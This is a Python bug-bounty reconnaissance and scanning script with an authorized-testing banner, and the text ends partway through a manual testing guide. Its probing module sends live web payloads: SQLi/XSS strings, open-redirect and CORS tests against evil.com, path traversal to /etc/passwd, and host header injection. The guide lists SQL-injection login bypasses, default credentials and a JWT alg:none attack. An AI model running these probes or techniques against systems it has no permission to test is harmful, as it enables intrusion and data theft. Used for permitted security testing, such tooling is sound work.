#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║         ADVANCED BUG BOUNTY RECON TOOL v2.0                 ║
║         For AUTHORIZED penetration testing ONLY             ║
║         Use only on domains you have permission to test      ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys
import os
import re
import json
import time
import socket
import threading
import subprocess
import urllib.request
import urllib.error
import urllib.parse
import http.client
import ssl
import concurrent.futures
from datetime import datetime

# ─────────────────────────────────────────────
# ANSI COLORS
# ─────────────────────────────────────────────
R  = "\033[91m"   # Red
G  = "\033[92m"   # Green
Y  = "\033[93m"   # Yellow
B  = "\033[94m"   # Blue
M  = "\033[95m"   # Magenta
C  = "\033[96m"   # Cyan
W  = "\033[97m"   # White
BOLD = "\033[1m"
DIM  = "\033[2m"
RST  = "\033[0m"

# ─────────────────────────────────────────────
# GLOBAL RESULTS STORE
# ─────────────────────────────────────────────
results = {
    "domain": "",
    "timestamp": "",
    "subdomains": [],
    "real_ips": [],
    "open_ports": {},
    "waf_info": {},
    "cms_info": {},
    "urls": [],
    "js_files": [],
    "js_secrets": [],
    "headers_analysis": {},
    "vulnerabilities": [],
    "manual_tips": []
}

# ─────────────────────────────────────────────
# UTILITIES
# ─────────────────────────────────────────────
def banner():
    print(f"""
{M}{BOLD}
 ██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
 ██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
 ██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
 ██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
 ██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
 ╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝  
{RST}
{C}              Advanced Bug Bounty Recon Tool v2.0 | For AUTHORIZED Testing Only{RST}
{Y}              ⚠  Only use on domains you have explicit permission to test  ⚠{RST}
""")

def info(msg):    print(f"{B}[*]{RST} {msg}")
def success(msg): print(f"{G}[+]{RST} {msg}")
def warn(msg):    print(f"{Y}[!]{RST} {msg}")
def error(msg):   print(f"{R}[-]{RST} {msg}")
def section(title):
    print(f"\n{M}{BOLD}{'═'*60}{RST}")
    print(f"{M}{BOLD}  ▶  {title}{RST}")
    print(f"{M}{BOLD}{'═'*60}{RST}\n")

def http_get(url, timeout=8, headers=None):
    """Simple HTTP GET with error handling."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url)
        req.add_header("User-Agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.read().decode("utf-8", errors="ignore"), resp.headers, resp.status
    except Exception:
        return None, None, None

def run_cmd(cmd):
    """Run shell command if tool exists, return output."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=60
        )
        return result.stdout.strip()
    except Exception:
        return ""

def tool_exists(tool):
    return run_cmd(f"which {tool}") != ""

# ─────────────────────────────────────────────
# MODULE 1: WHOIS & DNS RECON
# ─────────────────────────────────────────────
def whois_recon(domain):
    section("MODULE 1: WHOIS & DNS RECON")
    info(f"Target: {domain}")

    # WHOIS
    if tool_exists("whois"):
        out = run_cmd(f"whois {domain} 2>/dev/null | head -40")
        if out:
            success("WHOIS data retrieved")
            print(f"{DIM}{out}{RST}\n")
    else:
        warn("whois not installed. Try: sudo apt install whois")

    # DNS Records
    info("Gathering DNS records...")
    record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]
    dns_records = {}
    for rtype in record_types:
        if tool_exists("dig"):
            out = run_cmd(f"dig {rtype} {domain} +short 2>/dev/null")
        elif tool_exists("nslookup"):
            out = run_cmd(f"nslookup -type={rtype} {domain} 2>/dev/null")
        else:
            out = ""
        if out:
            dns_records[rtype] = out.splitlines()
            success(f"{rtype} records: {out[:120]}")

    # SPF / DMARC (Email security misconfig)
    info("Checking email security records (SPF/DMARC)...")
    if tool_exists("dig"):
        spf = run_cmd(f"dig TXT {domain} +short 2>/dev/null | grep spf")
        dmarc = run_cmd(f"dig TXT _dmarc.{domain} +short 2>/dev/null")
        if spf:
            success(f"SPF: {spf}")
        else:
            warn("No SPF record found → Email spoofing may be possible!")
            results["vulnerabilities"].append("Missing SPF record - email spoofing risk")
        if dmarc:
            success(f"DMARC: {dmarc}")
        else:
            warn("No DMARC record → Email spoofing risk!")
            results["vulnerabilities"].append("Missing DMARC record - email spoofing risk")

# ─────────────────────────────────────────────
# MODULE 2: SUBDOMAIN ENUMERATION
# ─────────────────────────────────────────────
SUBDOMAINS_WORDLIST = [
    "www","mail","ftp","admin","api","dev","test","staging","beta","blog",
    "shop","store","portal","app","mobile","m","cdn","static","media","img",
    "images","assets","download","upload","vpn","remote","ssh","smtp","pop",
    "imap","ns1","ns2","dns","webmail","support","help","forum","wiki","docs",
    "git","svn","jenkins","jira","confluence","grafana","kibana","elastic",
    "db","database","mysql","postgres","redis","mongo","backup","old","new",
    "internal","intranet","corp","login","auth","sso","oauth","id","account",
    "accounts","pay","payment","billing","invoice","secure","ssl","dashboard",
    "manage","management","manager","control","panel","cpanel","whm","plesk",
    "webdisk","autodiscover","autoconfig","exchange","owa","outlook","calendar",
    "crm","erp","hr","finance","marketing","sales","reporting","analytics",
    "tracking","monitor","status","health","ping","test2","uat","qa","prod",
    "sandbox","demo","preview","stage","pre","pre-prod","preprod","v2","v3",
    "api2","api-v1","api-v2","rest","graphql","ws","websocket","socket",
    "chat","video","stream","live","cdn2","assets2","s3","storage","files",
    "upload2","img2","images2","media2","news","careers","jobs","press",
]

def subdomain_enum(domain):
    section("MODULE 2: SUBDOMAIN ENUMERATION")
    found = set()

    # Passive: crt.sh certificate transparency
    info("Querying crt.sh (certificate transparency)...")
    url = f"https://crt.sh/?q=%.{domain}&output=json"
    body, _, _ = http_get(url, timeout=15)
    if body:
        try:
            data = json.loads(body)
            for entry in data:
                name = entry.get("name_value", "")
                for sub in name.splitlines():
                    sub = sub.strip().lstrip("*.")
                    if sub.endswith(domain) and sub != domain:
                        found.add(sub)
            success(f"crt.sh found {len(found)} subdomains")
        except Exception:
            warn("crt.sh parse error")

    # Passive: HackerTarget
    info("Querying HackerTarget...")
    url2 = f"https://api.hackertarget.com/hostsearch/?q={domain}"
    body2, _, _ = http_get(url2, timeout=10)
    if body2 and "error" not in body2.lower():
        for line in body2.splitlines():
            sub = line.split(",")[0].strip()
            if sub.endswith(domain):
                found.add(sub)
        success(f"HackerTarget found additional subdomains")

    # Active: brute-force
    info(f"Brute-forcing {len(SUBDOMAINS_WORDLIST)} common subdomains...")
    lock = threading.Lock()

    def check_sub(word):
        sub = f"{word}.{domain}"
        try:
            ip = socket.gethostbyname(sub)
            with lock:
                found.add(sub)
                success(f"  Found: {sub} → {ip}")
        except Exception:
            pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        ex.map(check_sub, SUBDOMAINS_WORDLIST)

    # Check for zone transfer (critical misconfiguration)
    info("Checking DNS zone transfer (AXFR)...")
    if tool_exists("dig"):
        ns_out = run_cmd(f"dig NS {domain} +short 2>/dev/null")
        for ns in ns_out.splitlines():
            ns = ns.strip().rstrip(".")
            axfr = run_cmd(f"dig AXFR {domain} @{ns} 2>/dev/null")
            if axfr and "Transfer failed" not in axfr and len(axfr) > 100:
                warn(f"ZONE TRANSFER POSSIBLE via {ns}!")
                results["vulnerabilities"].append(f"DNS Zone Transfer allowed on {ns}")

    found_list = sorted(found)
    results["subdomains"] = found_list
    success(f"\nTotal subdomains found: {len(found_list)}")
    for s in found_list[:50]:
        print(f"  {G}•{RST} {s}")
    if len(found_list) > 50:
        print(f"  ... and {len(found_list)-50} more")
    return found_list

# ─────────────────────────────────────────────
# MODULE 3: REAL IP FINDER (CDN/WAF bypass)
# ─────────────────────────────────────────────
def find_real_ip(domain):
    section("MODULE 3: REAL IP FINDER (CDN/Cloudflare Bypass)")

    ips = set()

    # Direct DNS resolution
    try:
        ip = socket.gethostbyname(domain)
        ips.add(ip)
        info(f"Current DNS IP: {ip}")
    except Exception:
        pass

    # Historical DNS via SecurityTrails public endpoint
    info("Checking historical DNS (SecurityTrails public)...")
    url = f"https://api.hackertarget.com/nslookup/?q={domain}"
    body, _, _ = http_get(url, timeout=10)
    if body:
        for line in body.splitlines():
            match = re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', line)
            ips.update(match)

    # Check subdomains that might leak real IP (mail, ftp, direct, etc.)
    leak_subs = ["mail", "ftp", "smtp", "pop", "imap", "direct", "origin",
                 "cpanel", "webmail", "autodiscover"]
    info("Checking common subdomains that leak real IP...")
    for sub in leak_subs:
        try:
            ip = socket.gethostbyname(f"{sub}.{domain}")
            ips.add(ip)
            success(f"  {sub}.{domain} → {ip}")
        except Exception:
            pass

    # SPF record IP leak
    if tool_exists("dig"):
        spf = run_cmd(f"dig TXT {domain} +short 2>/dev/null | grep spf")
        ips_in_spf = re.findall(r'ip[46]:(\S+)', spf)
        for ip in ips_in_spf:
            ips.add(ip.rstrip("/32"))
            success(f"  IP from SPF record: {ip}")

    # Check if behind Cloudflare
    cloudflare_ranges = ["103.21.244.", "103.22.200.", "103.31.4.", "104.16.",
                         "104.17.", "104.18.", "104.19.", "104.20.", "104.21.",
                         "108.162.192.", "131.0.72.", "141.101.64.", "162.158.",
                         "172.64.", "172.65.", "172.66.", "172.67.", "173.245.",
                         "188.114.96.", "188.114.97.", "190.93.240.", "197.234.240.",
                         "198.41.128.", "199.27.128."]
    for ip in list(ips):
        for cf in cloudflare_ranges:
            if ip.startswith(cf):
                warn(f"IP {ip} is behind Cloudflare CDN")
                results["waf_info"]["cloudflare"] = True
                break

    results["real_ips"] = list(ips)
    success(f"Total IPs found: {list(ips)}")
    return list(ips)

# ─────────────────────────────────────────────
# MODULE 4: PORT SCANNING
# ─────────────────────────────────────────────
COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
    1433: "MSSQL", 1521: "Oracle", 2375: "Docker", 2376: "Docker-TLS",
    3000: "Node/Grafana", 3306: "MySQL", 4243: "Docker", 5432: "PostgreSQL",
    5900: "VNC", 6379: "Redis", 7001: "WebLogic", 8000: "HTTP-Alt",
    8008: "HTTP-Alt", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt", 8888: "Jupyter",
    9000: "PHP-FPM", 9090: "Prometheus", 9200: "Elasticsearch", 9300: "Elasticsearch",
    11211: "Memcached", 27017: "MongoDB", 27018: "MongoDB", 28017: "MongoDB-Web"
}

def port_scan(target):
    section("MODULE 4: PORT SCANNING")
    info(f"Scanning {len(COMMON_PORTS)} common ports on {target}...")
    open_ports = {}
    lock = threading.Lock()

    def check_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            result = sock.connect_ex((target, port))
            sock.close()
            if result == 0:
                service = COMMON_PORTS.get(port, "Unknown")
                with lock:
                    open_ports[port] = service
                    success(f"  Port {port:5d}/tcp  OPEN  → {service}")
                    # Flag dangerous exposed services
                    if port in [6379, 27017, 9200, 2375, 11211]:
                        warn(f"    ⚠ {service} exposed without auth — HIGH RISK!")
                        results["vulnerabilities"].append(
                            f"Dangerous service exposed: {service} on port {port}"
                        )
        except Exception:
            pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
        ex.map(check_port, COMMON_PORTS.keys())

    results["open_ports"][target] = open_ports
    if not open_ports:
        warn("No common ports open (or filtered by firewall)")
    return open_ports

# ─────────────────────────────────────────────
# MODULE 5: WAF DETECTION
# ─────────────────────────────────────────────
WAF_SIGNATURES = {
    "Cloudflare":     ["cloudflare", "cf-ray", "__cfduid", "cf-request-id"],
    "Akamai":         ["akamai", "ak_bmsc", "ak-bmsc", "x-akamai"],
    "AWS WAF":        ["awswaf", "x-amzn-requestid", "x-amz-cf-id"],
    "Incapsula":      ["incap_ses", "visid_incap", "x-iinfo", "x-cdn=incapsula"],
    "Sucuri":         ["sucuri", "x-sucuri-id", "x-sucuri-cache"],
    "ModSecurity":    ["mod_security", "modsecurity", "501 method not implemented"],
    "F5 BIG-IP":      ["bigip", "f5", "ts=", "x-wa-info"],
    "Barracuda":      ["barracuda", "barra_counter_session"],
    "Imperva":        ["x-iinfo", "imperva", "_pk_id"],
    "Wordfence":      ["wordfence"],
}

def detect_waf(domain):
    section("MODULE 5: WAF DETECTION")
    info(f"Detecting WAF/CDN for {domain}...")

    # Normal request
    body, headers, status = http_get(f"https://{domain}", timeout=10)
    if not headers:
        body, headers, status = http_get(f"http://{domain}", timeout=10)

    detected = []
    if headers:
        hdr_str = str(dict(headers)).lower()
        for waf, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in hdr_str:
                    detected.append(waf)
                    success(f"  WAF Detected: {waf} (signature: {sig})")
                    break

    # Send a suspicious payload to trigger WAF
    info("Sending test payload to trigger WAF response...")
    test_url = f"https://{domain}/?id=1'%20OR%201=1--&<script>alert(1)</script>"
    _, waf_headers, waf_status = http_get(test_url, timeout=8)
    if waf_status in [403, 406, 429, 501, 503]:
        warn(f"  WAF/IPS blocking detected (status {waf_status} on payload)")
        results["waf_info"]["blocks_payloads"] = True

    if not detected:
        info("No WAF detected — site may be directly accessible!")
        results["waf_info"]["detected"] = "None"
    else:
        results["waf_info"]["detected"] = detected

    return detected

# ─────────────────────────────────────────────
# MODULE 6: CMS DETECTION
# ─────────────────────────────────────────────
CMS_SIGNATURES = {
    "WordPress":  ["/wp-content/", "/wp-includes/", "wp-json", "WordPress"],
    "Joomla":     ["/components/com_", "Joomla!", "/administrator/"],
    "Drupal":     ["Drupal", "/sites/default/files/", "X-Generator: Drupal"],
    "Magento":    ["Mage.Cookies", "/skin/frontend/", "magento"],
    "Shopify":    ["cdn.shopify.com", "Shopify.shop", "myshopify.com"],
    "Laravel":    ["laravel_session", "XSRF-TOKEN", "laravel"],
    "Django":     ["csrfmiddlewaretoken", "django", "X-Frame-Options"],
    "ASP.NET":    ["__VIEWSTATE", "ASP.NET", "X-AspNet-Version"],
    "Ruby Rails": ["_rails_session", "X-Runtime", "X-Powered-By: Phusion"],
    "Strapi":     ["strapi", "/api/users", "X-Powered-By: Strapi"],
    "Ghost":      ["ghost.io", "/ghost/", "X-Ghost-Cache"],
    "Wix":        ["wixsite.com", "X-Wix-", "wix.com"],
}

def detect_cms(domain):
    section("MODULE 6: CMS DETECTION")
    info(f"Detecting CMS/Framework for {domain}...")

    body, headers, status = http_get(f"https://{domain}", timeout=10)
    if not body:
        body, headers, status = http_get(f"http://{domain}", timeout=10)

    detected = []
    search_text = (body or "") + str(dict(headers) if headers else "")
    search_text_lower = search_text.lower()

    for cms, sigs in CMS_SIGNATURES.items():
        for sig in sigs:
            if sig.lower() in search_text_lower:
                detected.append(cms)
                success(f"  CMS/Framework Detected: {cms}")
                # Check for known vulnerable paths
                if cms == "WordPress":
                    info("  Checking WordPress-specific paths...")
                    wp_paths = [
                        "/wp-login.php", "/xmlrpc.php", "/wp-json/wp/v2/users",
                        "/wp-content/debug.log", "/.git/HEAD", "/wp-config.php.bak"
                    ]
                    for path in wp_paths:
                        _, _, s = http_get(f"https://{domain}{path}", timeout=5)
                        if s and s < 404:
                            warn(f"    Accessible: https://{domain}{path} (status {s})")
                            results["vulnerabilities"].append(f"WordPress path exposed: {path}")
                break

    if not detected:
        info("No known CMS fingerprint detected (custom app or well-hardened)")

    results["cms_info"]["detected"] = detected
    return detected

# ─────────────────────────────────────────────
# MODULE 7: URL & ENDPOINT GATHERING
# ─────────────────────────────────────────────
INTERESTING_PATHS = [
    "/.git/HEAD", "/.git/config", "/.env", "/.env.local", "/.env.backup",
    "/config.php", "/config.json", "/config.yml", "/config.yaml",
    "/.htaccess", "/.htpasswd", "/web.config", "/robots.txt", "/sitemap.xml",
    "/swagger.json", "/swagger.yaml", "/openapi.json", "/api/swagger.json",
    "/api/v1/", "/api/v2/", "/api/v3/", "/graphql", "/graphiql",
    "/.DS_Store", "/backup.zip", "/backup.tar.gz", "/db.sql", "/dump.sql",
    "/admin/", "/administrator/", "/login/", "/dashboard/",
    "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
    "/server-status", "/server-info", "/.well-known/security.txt",
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
    "/metrics", "/health", "/healthz", "/status", "/_profiler/",
    "/__debugbar/", "/telescope/", "/horizon/", "/nova/",
    "/wp-login.php", "/xmlrpc.php", "/phpmyadmin/", "/pma/",
    "/adminer.php", "/webadmin/", "/cpanel/", "/manager/html",
    "/console/", "/.travis.yml", "/Dockerfile", "/docker-compose.yml",
    "/package.json", "/composer.json", "/requirements.txt",
]

def gather_urls(domain):
    section("MODULE 7: URL & ENDPOINT GATHERING")
    found_urls = []

    # Check interesting paths
    info(f"Probing {len(INTERESTING_PATHS)} sensitive paths...")

    def check_path(path):
        url = f"https://{domain}{path}"
        body, headers, status = http_get(url, timeout=6)
        if status and status not in [404, 410]:
            found_urls.append({"url": url, "status": status})
            color = G if status == 200 else Y
            print(f"  {color}[{status}]{RST} {url}")
            # Flag critical exposures
            critical = [".env", ".git", "config", "backup", "sql", "phpinfo",
                        "actuator/env", "docker", "swagger", "graphql"]
            for kw in critical:
                if kw in path.lower() and status == 200:
                    warn(f"    ⚠ CRITICAL: Sensitive file exposed!")
                    results["vulnerabilities"].append(f"Sensitive file exposed: {url}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        ex.map(check_path, INTERESTING_PATHS)

    # Crawl robots.txt
    info("\nParsing robots.txt for hidden paths...")
    body, _, _ = http_get(f"https://{domain}/robots.txt", timeout=8)
    if body:
        for line in body.splitlines():
            if line.startswith("Disallow:") or line.startswith("Allow:"):
                path = line.split(":", 1)[1].strip()
                if path and path != "/":
                    print(f"  {C}[robots]{RST} {domain}{path}")

    # Wayback Machine
    info("\nQuerying Wayback Machine for historical URLs...")
    wm_url = f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=text&fl=original&collapse=urlkey&limit=200"
    body, _, _ = http_get(wm_url, timeout=15)
    if body:
        wayback_urls = body.splitlines()
        success(f"Wayback Machine: {len(wayback_urls)} historical URLs found")
        # Filter interesting ones
        interesting = [u for u in wayback_urls if any(
            kw in u.lower() for kw in
            ["admin", "api", "login", "upload", "config", "backup", "debug",
             "test", "dev", "phpinfo", "sql", "dump", "export", "import", "token"]
        )]
        for u in interesting[:30]:
            print(f"  {Y}[wayback]{RST} {u}")
        results["urls"].extend(interesting)

    results["urls"].extend([u["url"] for u in found_urls])
    return found_urls

# ─────────────────────────────────────────────
# MODULE 8: JS FILE ANALYSIS
# ─────────────────────────────────────────────
JS_SECRET_PATTERNS = {
    "AWS Access Key":      r'AKIA[0-9A-Z]{16}',
    "AWS Secret Key":      r'(?i)aws.{0,20}secret.{0,20}["\']([0-9a-zA-Z/+]{40})',
    "Google API Key":      r'AIza[0-9A-Za-z\\-_]{35}',
    "Google OAuth":        r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
    "Firebase URL":        r'https://[a-z0-9-]+\.firebaseio\.com',
    "GitHub Token":        r'gh[pousr]_[A-Za-z0-9_]{36}',
    "Slack Token":         r'xox[baprs]-[0-9a-zA-Z]{10,48}',
    "Slack Webhook":       r'https://hooks\.slack\.com/services/T[0-9A-Z]{8}/B[0-9A-Z]{8}/[0-9a-zA-Z]{24}',
    "JWT Token":           r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
    "Private Key":         r'-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----',
    "Basic Auth URL":      r'https?://[a-zA-Z0-9_\-]+:[a-zA-Z0-9_\-]+@',
    "API Key Generic":     r'(?i)(api[_\-]?key|apikey|api[_\-]?secret)["\s]*[:=]["\s]*["\']([a-zA-Z0-9_\-]{20,})',
    "Password in URL":     r'(?i)(password|passwd|pwd)["\s]*[:=]["\s]*["\']([^\s"\']{6,})',
    "Bearer Token":        r'(?i)bearer [a-zA-Z0-9_\-\.=:_\+\/]{20,}',
    "Stripe Key":          r'(?:r|s)k_(?:live|test)_[0-9a-zA-Z]{24}',
    "Twilio Key":          r'SK[0-9a-fA-F]{32}',
    "SendGrid Key":        r'SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}',
    "Mailgun Key":         r'key-[0-9a-zA-Z]{32}',
    "Internal IP":         r'(?:^|\s)(10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)',
    "S3 Bucket":           r's3\.amazonaws\.com/[a-zA-Z0-9_\-\.]+',
    "GraphQL Endpoint":    r'(?i)(graphql|/gql)["\']',
    "Debug/Dev endpoint":  r'(?i)(localhost|127\.0\.0\.1|0\.0\.0\.0):[0-9]{2,5}',
}

def find_js_files(domain):
    """Find JS files from homepage."""
    body, _, _ = http_get(f"https://{domain}", timeout=10)
    if not body:
        return []
    js_files = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', body)
    absolute = []
    for js in js_files:
        if js.startswith("http"):
            absolute.append(js)
        elif js.startswith("//"):
            absolute.append("https:" + js)
        elif js.startswith("/"):
            absolute.append(f"https://{domain}{js}")
        else:
            absolute.append(f"https://{domain}/{js}")
    return list(set(absolute))

def analyze_js(domain):
    section("MODULE 8: JS FILE ANALYSIS & SECRET HUNTING")
    js_files = find_js_files(domain)
    info(f"Found {len(js_files)} JS files on homepage")

    all_secrets = []
    for js_url in js_files[:20]:  # Limit to 20 files
        info(f"Analyzing: {js_url[:80]}...")
        body, _, _ = http_get(js_url, timeout=8)
        if not body:
            continue
        results["js_files"].append(js_url)
        for secret_type, pattern in JS_SECRET_PATTERNS.items():
            matches = re.findall(pattern, body)
            if matches:
                for m in matches[:3]:
                    match_str = m if isinstance(m, str) else m[0] if m else ""
                    if len(match_str) > 5:
                        warn(f"  [{secret_type}] Found in {js_url.split('/')[-1]}: {match_str[:60]}...")
                        all_secrets.append({
                            "type": secret_type,
                            "file": js_url,
                            "value": match_str[:100]
                        })
                        results["vulnerabilities"].append(
                            f"Secret in JS: {secret_type} in {js_url}"
                        )

    results["js_secrets"] = all_secrets
    if all_secrets:
        warn(f"\nTotal secrets/sensitive data found in JS: {len(all_secrets)}")
    else:
        success("No obvious secrets found in JS files")
    return all_secrets

# ─────────────────────────────────────────────
# MODULE 9: HEADER & SSL ANALYSIS
# ─────────────────────────────────────────────
def analyze_headers(domain):
    section("MODULE 9: SECURITY HEADERS & SSL ANALYSIS")
    body, headers, status = http_get(f"https://{domain}", timeout=10)

    security_headers = {
        "Strict-Transport-Security": "HSTS",
        "Content-Security-Policy": "CSP",
        "X-Frame-Options": "Clickjacking Protection",
        "X-Content-Type-Options": "MIME Sniffing Protection",
        "X-XSS-Protection": "XSS Filter (legacy)",
        "Referrer-Policy": "Referrer Policy",
        "Permissions-Policy": "Permissions Policy",
        "Access-Control-Allow-Origin": "CORS Policy",
        "X-Powered-By": "Server Tech Disclosure",
        "Server": "Server Header",
    }

    if headers:
        hdr_dict = dict(headers)
        info("Security header analysis:")
        for hdr, desc in security_headers.items():
            val = hdr_dict.get(hdr, hdr_dict.get(hdr.lower(), None))
            if val:
                if hdr in ["X-Powered-By", "Server"]:
                    warn(f"  ⚠ {desc}: {val} (Information Disclosure!)")
                    results["vulnerabilities"].append(f"Info disclosure: {hdr}: {val}")
                elif hdr == "Access-Control-Allow-Origin" and val == "*":
                    warn(f"  ⚠ CORS: Wildcard (*) — potential data exposure!")
                    results["vulnerabilities"].append("CORS misconfiguration: wildcard origin")
                else:
                    success(f"  ✓ {desc} present: {str(val)[:80]}")
            else:
                if hdr not in ["X-Powered-By", "Server", "X-XSS-Protection"]:
                    warn(f"  ✗ Missing: {desc} ({hdr})")
                    results["vulnerabilities"].append(f"Missing security header: {hdr}")

    # SSL check
    info("\nSSL/TLS Certificate Analysis...")
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
            s.settimeout(8)
            s.connect((domain, 443))
            cert = s.getpeercert()
            exp = cert.get("notAfter", "")
            success(f"  Certificate expires: {exp}")
            # Check for wildcards
            sans = cert.get("subjectAltName", [])
            for _, san in sans:
                if san.startswith("*"):
                    info(f"  Wildcard cert: {san}")
    except Exception as e:
        warn(f"  SSL check failed: {e}")

    results["headers_analysis"] = {"checked": True}

# ─────────────────────────────────────────────
# MODULE 10: BASIC VULNERABILITY PROBING
# ─────────────────────────────────────────────
def probe_vulnerabilities(domain):
    section("MODULE 10: BASIC VULNERABILITY PROBING")

    base = f"https://{domain}"

    # Open Redirect
    info("Testing for Open Redirect...")
    or_payloads = [
        f"{base}/?url=https://evil.com",
        f"{base}/?redirect=https://evil.com",
        f"{base}/?next=https://evil.com",
        f"{base}/?return=https://evil.com",
        f"{base}/login?next=//evil.com",
    ]
    for url in or_payloads:
        _, h, s = http_get(url, timeout=5)
        if h and s in [301, 302, 303, 307, 308]:
            loc = h.get("Location", "")
            if "evil.com" in str(loc):
                warn(f"  Open Redirect found: {url}")
                results["vulnerabilities"].append(f"Open Redirect: {url}")

    # Reflected XSS probe (detect reflection only)
    info("Probing for reflected XSS markers...")
    xss_marker = "XSSTEST12345"
    xss_urls = [
        f"{base}/?q={xss_marker}",
        f"{base}/?search={xss_marker}",
        f"{base}/?name={xss_marker}",
    ]
    for url in xss_urls:
        body, _, s = http_get(url, timeout=5)
        if body and xss_marker in body:
            warn(f"  Parameter reflected in response (potential XSS): {url}")
            results["vulnerabilities"].append(f"Reflected parameter (possible XSS): {url}")

    # Directory traversal
    info("Testing for path traversal...")
    pt_payloads = [
        f"{base}/../../../../etc/passwd",
        f"{base}/?file=../../../etc/passwd",
        f"{base}/?page=../../../etc/passwd",
    ]
    for url in pt_payloads:
        body, _, s = http_get(url, timeout=5)
        if body and ("root:x:" in body or "daemon:" in body):
            warn(f"  Path Traversal CONFIRMED: {url}")
            results["vulnerabilities"].append(f"Path Traversal: {url}")

    # CORS misconfiguration
    info("Testing CORS misconfiguration...")
    _, headers, _ = http_get(
        f"{base}/api/user",
        timeout=5,
        headers={"Origin": "https://evil.com"}
    )
    if headers:
        acao = headers.get("Access-Control-Allow-Origin", "")
        acac = headers.get("Access-Control-Allow-Credentials", "")
        if "evil.com" in str(acao) and "true" in str(acac).lower():
            warn(f"  CORS misconfiguration: Reflects origin + allows credentials!")
            results["vulnerabilities"].append("CORS: reflects arbitrary origin with credentials=true")

    # Host Header Injection
    info("Testing Host Header Injection...")
    _, headers, status = http_get(
        f"{base}/",
        timeout=5,
        headers={"Host": "evil.com"}
    )
    if headers:
        loc = headers.get("Location", "")
        if "evil.com" in str(loc):
            warn(f"  Host Header Injection detected!")
            results["vulnerabilities"].append("Host Header Injection")

    # Subdomain Takeover check
    info("Checking for subdomain takeover indicators...")
    takeover_sigs = [
        "There is no app configured at that hostname",  # Heroku
        "No such app",  # Heroku
        "Repository not found",  # Bitbucket
        "This UserVoice subdomain",  # UserVoice
        "page not found on Bitbucket",  # Bitbucket
        "The request could not be satisfied",  # CloudFront
        "NoSuchBucket",  # S3
        "The specified bucket does not exist",  # S3
        "Sorry, We Couldn't Find That Page",  # GitHub Pages
        "404 Not Found",  # Generic
    ]
    for sub in results.get("subdomains", [])[:20]:
        body, _, status = http_get(f"https://{sub}", timeout=5)
        if body:
            for sig in takeover_sigs:
                if sig.lower() in body.lower():
                    warn(f"  Possible subdomain takeover: {sub} — '{sig}'")
                    results["vulnerabilities"].append(f"Subdomain takeover: {sub}")
                    break

    success("Basic vulnerability probing complete")

# ─────────────────────────────────────────────
# MODULE 11: MANUAL TESTING GUIDE
# ─────────────────────────────────────────────
def generate_manual_guide(domain):
    section("MODULE 11: MANUAL TESTING & EXPLOITATION GUIDE")

    cms = results["cms_info"].get("detected", [])
    ports = results["open_ports"]
    waf = results["waf_info"].get("detected", [])

    guide = f"""
{BOLD}{C}╔══════════════════════════════════════════════════════╗
║        MANUAL TESTING GUIDE FOR {domain[:20]:<20} ║
╚══════════════════════════════════════════════════════╝{RST}

{BOLD}{Y}【1】 AUTHENTICATION BYPASS TECHNIQUES{RST}
  → Try default credentials: admin/admin, admin/password, admin/123456
  → SQL Injection in login: admin'-- or ' OR '1'='1'--
  → Try password reset with different email cases: Test@email.com vs test@email.com
  → Check for JWT: decode at jwt.io, try alg:none attack, brute-force weak secrets
  → OAuth: try IDORs in redirect_uri, state parameter tampering
  → Test MFA bypass: replay tokens, response manipulation (change "success":false to true)

{BOLD}{Y}【2】 IDOR & BROKEN ACCESS CONTROL{RST}
  → Change numeric IDs in URLs: /user/123 → /user/124
  → Change UUIDs to other users' UUIDs
  → Try accessing admin endpoints while logged in as normal user
  → Horizontal/vertical privilege escalation: change role=user to role=admin in requests
  → Try accessing other users' data: /api/orders/OTHER_USER_ID
  → Test HTTP method switching: GET → POST → PUT → DELETE on same endpoint

